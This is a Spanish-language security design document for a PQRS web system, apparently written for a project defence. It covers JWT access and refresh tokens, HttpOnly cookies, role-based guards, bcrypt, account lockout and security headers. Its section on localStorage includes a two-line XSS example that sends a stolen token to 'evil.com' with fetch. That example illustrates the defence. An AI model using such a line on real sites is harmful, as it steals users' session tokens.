# Seguridad del Sistema PQRS

## 1. Autenticación JWT

### Access Token vs Refresh Token

El sistema utiliza una estrategia de **doble token** para equilibrar seguridad y usabilidad:

| Característica     | Access Token                        | Refresh Token                          |
|--------------------|-------------------------------------|----------------------------------------|
| Vida útil          | **15 minutos**                      | **7 días**                             |
| Algoritmo          | HS256 firmado con `JWT_SECRET`      | HS256 firmado con `JWT_REFRESH_SECRET` |
| Almacenamiento     | Memoria del navegador (variable JS) | Cookie **HttpOnly** (inaccesible desde JS) |
| Enviado en         | Header `Authorization: Bearer …`   | Cookie automática al dominio/path      |
| Almacenado en BD   | No                                  | **Hash bcrypt** del token              |

### ¿Por qué el access token dura solo 15 minutos?

Si un atacante intercepta el access token (por ejemplo, mediante un XSS residual o un log filtrado), solo tiene **15 minutos** para explotarlo antes de que expire. Al ser un token de vida corta, la ventana de ataque es mínima. No se puede revocar un JWT en tránsito, por eso la vida corta es la defensa principal.

### ¿Por qué el refresh token va en cookie HttpOnly?

El refresh token se almacena en una cookie con los siguientes atributos:

```http
Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict; Path=/api/auth/refresh
```

- **HttpOnly**: JavaScript del navegador no puede leer ni robar esta cookie. Un script XSS puede robar variables JS, pero no cookies HttpOnly.
- **SameSite=Strict**: La cookie solo se envía en peticiones originadas desde el propio dominio, mitigando ataques CSRF.
- **Path=/api/auth/refresh**: La cookie solo se envía al endpoint de renovación, reduciendo la superficie de exposición.
- El token en BD se almacena como **hash bcrypt**, nunca en claro. Si la BD se filtra, los hashes son inútiles sin el token original.

### Diagrama del flujo de autenticación

```
Usuario                  Frontend                    Backend
  │                         │                            │
  ├──── credentials ────────►                            │
  │                         ├──── POST /auth/login ─────►│
  │                         │                            ├── verifica bcrypt
  │                         │                            ├── genera access token (15m)
  │                         │                            ├── genera refresh token (7d)
  │                         │                            ├── guarda hash(refresh) en BD
  │                         │◄─── { accessToken } ───────┤
  │                         │◄─── cookie refreshToken ───┤
  │                         ├── setAccessToken(memory)   │
  │                         │                            │
  │  (15 minutos después)   │                            │
  │                         ├──── GET /api/... ─────────►│
  │                         │     Bearer <access token>  ├── token expirado → 401
  │                         │◄─── 401 ───────────────────┤
  │                         │                            │
  │  [interceptor automático]                            │
  │                         ├──── POST /auth/refresh ────►│
  │                         │     (cookie HttpOnly)      ├── verifica firma
  │                         │                            ├── compara bcrypt hash en BD
  │                         │◄─── { accessToken } ───────┤
  │                         ├── setAccessToken(memory)   │
  │                         ├──── GET /api/... ─────────►│ (reintento automático)
  │                         │◄─── 200 OK ────────────────┤
```

### Restauración de sesión al recargar (APP_INITIALIZER)

Al recargar la página el access token desaparece de memoria. El `APP_INITIALIZER` de Angular ejecuta `tryRestoreSession()` antes de que la app se renderice:

1. Llama a `POST /api/auth/refresh` (la cookie HttpOnly se envía automáticamente).
2. Recibe el nuevo access token y lo guarda en memoria.
3. Llama a `GET /api/auth/me` para cargar los datos del usuario en el signal `currentUser`.
4. Si falla (cookie expirada o revocada), limpia la sesión silenciosamente.

---

## 2. Control de Acceso por Roles (RBAC)

### Roles del sistema

| Rol       | Valor en BD | Descripción                                    |
|-----------|-------------|------------------------------------------------|
| `admin`   | `admin`     | Acceso total: gestión de usuarios, estadísticas, cambio de estado y prioridad de PQRS |
| `usuario` | `usuario`   | Ciudadano: puede crear y consultar sus propias PQRS |

### Matriz de permisos por endpoint

| Método | Endpoint                         | Acceso requerido            |
|--------|----------------------------------|-----------------------------|
| POST   | /api/auth/login                  | Público (`@Public()`)       |
| POST   | /api/auth/register               | Público (`@Public()`)       |
| POST   | /api/auth/refresh                | Público (`@Public()`)       |
| GET    | /api/auth/check-email            | Público (`@Public()`)       |
| POST   | /api/auth/logout                 | Autenticado                 |
| GET    | /api/auth/me                     | Autenticado                 |
| GET    | /api/pqrs                        | Autenticado                 |
| POST   | /api/pqrs                        | Autenticado (ciudadano)     |
| GET    | /api/pqrs/:id                    | Autenticado (dueño o admin) |
| POST   | /api/pqrs/:id/respuestas         | Autenticado                 |
| GET    | /api/pqrs/:id/historial          | Autenticado (dueño o admin) |
| PATCH  | /api/pqrs/:id/status             | `@Roles(ADMIN)`             |
| PATCH  | /api/pqrs/:id/priority           | `@Roles(ADMIN)`             |
| DELETE | /api/pqrs/:id                    | Autenticado (dueño o admin) |
| POST   | /api/pqrs/:id/attachments        | Autenticado (dueño o admin) |
| GET    | /api/dashboard/stats             | `@Roles(ADMIN)`             |
| GET    | /api/users                       | `@Roles(ADMIN)`             |
| POST   | /api/users                       | `@Roles(ADMIN)`             |
| PATCH  | /api/users/:id                   | `@Roles(ADMIN)`             |
| DELETE | /api/users/:id                   | `@Roles(ADMIN)`             |

### Cómo funciona RolesGuard

```typescript
// El decorador @Roles almacena metadata en el handler
@Roles(UserRole.ADMIN)
@Get('stats')
getStats() { ... }

// RolesGuard lee esa metadata con Reflector
const rolesRequeridos = this.reflector.getAllAndOverride<UserRole[]>(
  ROLES_KEY,
  [context.getHandler(), context.getClass()],
);
// Compara con el rol del usuario en el token JWT
const tieneRol = rolesRequeridos.includes(user.rol);
if (!tieneRol) throw new ForbiddenException(...);
```

### Diferencia entre 401 y 403

| Código | Significado              | Cuándo ocurre                                            |
|--------|--------------------------|----------------------------------------------------------|
| **401** | No autenticado          | Token ausente, expirado o firma inválida                 |
| **403** | Sin permisos (Forbidden) | Token válido pero el rol del usuario no tiene acceso     |

---

## 3. Contraseñas Cifradas con bcrypt

### ¿Por qué bcrypt?

bcrypt fue diseñado específicamente para almacenar contraseñas. A diferencia de SHA-256 o MD5:

| Algoritmo | Salt automático | Costoso por diseño | Resistente a GPU |
|-----------|-----------------|--------------------|------------------|
| MD5       | ✗               | ✗                  | ✗                |
| SHA-256   | ✗               | ✗                  | ✗                |
| bcrypt    | ✓               | **✓ (factor de coste configurable)** | **✓** |

- **Salt automático**: bcrypt genera un salt único por contraseña. Dos usuarios con la misma contraseña tienen hashes distintos, protegiendo contra rainbow tables.
- **Factor de coste (rounds)**: Con `BCRYPT_ROUNDS=12`, cada hash tarda ~250ms en generarse. Para un atacante que intenta por fuerza bruta, esto hace computacionalmente inviable probar millones de contraseñas por segundo.

### Flujo del hash

```
Registro:   contraseña_plana → bcrypt.hash(pass, 12) → hash guardado en BD
Login:      contraseña_plana → bcrypt.compare(pass, hash) → true/false
Respuesta:  hash NUNCA se devuelve en respuestas (select:false + interceptor sanitizador)
```

### Política de contraseñas

- Mínimo **8 caracteres**
- Al menos una **mayúscula** (A-Z)
- Al menos una **minúscula** (a-z)
- Al menos un **número** (0-9)
- Al menos un **carácter especial** (`@$!%*?&._-`)
- Máximo 72 caracteres (límite de bcrypt)

---

## 4. Protección de Rutas

### Backend: JwtAuthGuard + RolesGuard globales

Registrados como `APP_GUARD` en `AppModule`, aplican a **todas las rutas** del sistema:

```typescript
providers: [
  { provide: APP_GUARD, useClass: JwtAuthGuard },  // 1º: verificar token
  { provide: APP_GUARD, useClass: RolesGuard    },  // 2º: verificar rol
]
```

Para rutas que no requieren autenticación se usa `@Public()`:

```typescript
@Post('login')
@Public()        // ← salta el JwtAuthGuard
async login(...) { ... }
```

### Frontend: AuthGuard + AdminGuard

```
Usuario navega a /admin/stats
         │
         ▼
   authGuard: ¿currentUser() !== null?
         │ No → redirige a /login?returnUrl=/admin/stats
         │ Sí
         ▼
   adminGuard: ¿user.rol === 'admin'?
         │ No → redirige a /forbidden (403)
         │ Sí
         ▼
   Renderiza AdminStatsComponent
```

### ¿Por qué NO guardar el token en localStorage?

localStorage es accesible desde cualquier script JavaScript en la página. Un ataque **XSS** (Cross-Site Scripting) puede ejecutar:

```javascript
// Si el token estuviera en localStorage, esto funciona:
const token = localStorage.getItem('pqrs_token');
fetch('https://evil.com/steal?token=' + token);
```

Con el access token en **memoria (variable JS privada)**, este código devuelve `null`. El refresh token en **cookie HttpOnly** también es inaccesible desde JS.

---

## 5. Protecciones Adicionales

### Bloqueo de cuenta por intentos fallidos

```
Intento 1-4: Incrementa failedLoginAttempts
Intento 5:   lockedUntil = ahora + 15 minutos
             failedLoginAttempts = 0
Login exitoso: failedLoginAttempts = 0, lockedUntil = null
```

### Cabeceras HTTP de seguridad (Helmet)

`helmet` activa automáticamente:

| Cabecera                     | Protección                                    |
|------------------------------|-----------------------------------------------|
| `X-Content-Type-Options`     | Previene MIME-type sniffing                   |
| `X-Frame-Options`            | Previene clickjacking (iframes maliciosos)    |
| `Strict-Transport-Security`  | Fuerza HTTPS en producción                    |
| `X-XSS-Protection`           | Filtro XSS del navegador (legacy)             |
| `Content-Security-Policy`    | Restringe orígenes de scripts e imágenes      |

### CORS restringido

```typescript
app.enableCors({
  origin:      process.env.FRONTEND_URL ?? 'http://localhost:4200',
  methods:     ['GET', 'POST', 'PATCH', 'DELETE', 'OPTIONS'],
  credentials: true,  // necesario para enviar la cookie del refresh token
});
```

Solo el frontend autorizado puede hacer peticiones cross-origin al API.

### Interceptor sanitizador de respuestas

`SanitizeResponseInterceptor` elimina automáticamente de **todas las respuestas JSON**:
- `passwordHash`
- `refreshTokenHash`
- `failedLoginAttempts`
- `lockedUntil`

Aunque TypeORM los marque como `select: false`, esta capa extra garantiza que nunca aparezcan por error en ninguna respuesta.

### Revocación de refresh token

El hash del refresh token se borra de la BD en estos escenarios:
- El usuario hace **logout** explícito.
- El usuario **cambia su contraseña** (invalida todas las sesiones activas).
- Un admin **desactiva la cuenta** (`isActive = false`).

---

## 6. Vulnerabilidades Conocidas y Mitigaciones

| Vulnerabilidad            | Mitigación implementada                                                    |
|---------------------------|----------------------------------------------------------------------------|
| **XSS**                   | Access token en memoria, refresh token en cookie HttpOnly                  |
| **CSRF**                  | Cookie con `SameSite=Strict` — no se envía en peticiones cross-site        |
| **Brute force**           | Bloqueo de cuenta 15 minutos tras 5 intentos fallidos consecutivos         |
| **Privilege escalation**  | `RolesGuard` global verificado en cada petición; decorador `@Roles()`     |
| **Password leak (BD)**    | `passwordHash` con `select: false`; interceptor sanitizador en respuestas |
| **Token replay**          | Refresh token almacenado como hash bcrypt; se invalida en logout           |
| **Enumeración de usuarios** | Login retorna siempre "Credenciales incorrectas" (mismo mensaje para email inexistente y contraseña incorrecta) |
| **Inyección SQL**         | TypeORM con queries parametrizadas; nunca interpolación de strings          |
| **Archivos maliciosos**   | Validación por MIME type + firma binaria (magic numbers) + multer fileFilter |
| **Sesión persistente robada** | Refresh token con vida de 7 días; se revoca al cambiar contraseña     |

---

## 7. Checklist de Pruebas Manuales

```
✓ Login correcto → accessToken en memoria (NO en localStorage/sessionStorage),
  refreshToken en cookie HttpOnly (DevTools → Application → Cookies → verificar
  que la columna "HttpOnly" aparece marcada y no es accesible desde consola JS)

✓ Recargar página → APP_INITIALIZER restaura sesión automáticamente via cookie

✓ Token expirado (cambiar JWT_EXPIRES_IN=5s para prueba) → el interceptor
  renueva automáticamente con POST /auth/refresh sin que el usuario lo note

✓ Ciudadano: GET /api/dashboard/stats → 403 "No tienes permisos para
  realizar esta acción."

✓ 5 intentos fallidos con el mismo correo → 6° intento recibe:
  "Cuenta bloqueada. Intenta de nuevo en 15 minuto(s)."

✓ Logout → refreshTokenHash en BD queda NULL; usar el refresh token anterior
  en POST /auth/refresh → 401 "Refresh token no coincide."

✓ Petición sin Authorization header a ruta protegida → 401 "No autenticado.
  Se requiere un token válido."

✓ Ciudadano navega a /admin/stats en frontend → redirigido a /forbidden
  por el adminGuard
```

---

*Documento generado para sustentación del sistema PQRS — 2026*
